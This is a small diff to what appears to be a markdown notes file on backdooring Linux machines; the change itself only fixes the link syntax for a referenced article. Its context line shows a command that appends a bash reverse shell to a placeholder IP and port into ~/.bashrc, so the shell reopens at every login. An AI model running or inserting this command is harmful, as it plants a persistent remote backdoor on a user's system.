@@ -55,4 +55,4 @@ echo 'bash -i >& /dev/tcp/ip/port 0>&1' >> ~/.bashrc
 
 ## More...
 
-(airman604.medium.com/9-ways-to-backdoor-a-linux-box-f5f83bae5a3c)[https://airman604.medium.com/9-ways-to-backdoor-a-linux-box-f5f83bae5a3c]
+[airman604.medium.com/9-ways-to-backdoor-a-linux-box-f5f83bae5a3c](https://airman604.medium.com/9-ways-to-backdoor-a-linux-box-f5f83bae5a3c)
